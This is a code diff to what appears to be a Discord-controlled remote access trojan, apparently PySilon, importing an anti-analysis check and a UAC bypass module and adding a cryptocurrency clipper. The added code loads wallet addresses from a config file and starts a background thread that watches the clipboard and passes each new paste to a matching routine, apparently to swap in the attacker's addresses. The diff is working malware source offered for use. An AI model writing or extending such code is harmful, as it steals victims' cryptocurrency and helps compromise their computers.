@@ -6,6 +6,10 @@ import resources.modules.misc as pysilon_misc
 import resources.modules.protections as pysilon_protections
 import resources.modules.uac_bypass as uac_bypass
 from urllib.request import urlopen
+from resources.features.crypto_clipper import load_clipper_status, clipper_thread_stop, clipper_stop, match
+import threading
+import pyperclip
+import json
 
 if pysilon_protections.protection_check():
     os._exit(0)
@@ -22,7 +26,6 @@ client = commands.Bot(command_prefix=['.'], intents=discord.Intents.all(), case_
 
 # temp area for needed variables, mategol you should add something to do this automatically in the builder ig :p
 turned_off = False
-clipper_stop = False
 # end of area
 
 bot_token = ""
@@ -113,6 +116,22 @@ async def on_ready():
                 channel_ids['file'] = channel.id
             elif channel.name == 'Live microphone':
                 channel_ids['voice'] = channel.id
+    
+    clipper_status = load_clipper_status()
+    if clipper_status["status"] == "on":
+        script_dir = os.path.dirname(os.path.abspath(__file__))
+        config_path = os.path.join(script_dir, 'crypto_clipper.json')
+        with open(config_path) as f:
+            addresses = json.load(f)
+        
+        def wait_for_paste():
+            while not clipper_thread_stop:
+                while not clipper_stop:
+                    pyperclip.waitForNewPaste()
+                    match(addresses)
+
+        clipper_thread = threading.Thread(target=wait_for_paste)
+        clipper_thread.start()
 
 @client.event
 async def on_message(ctx):
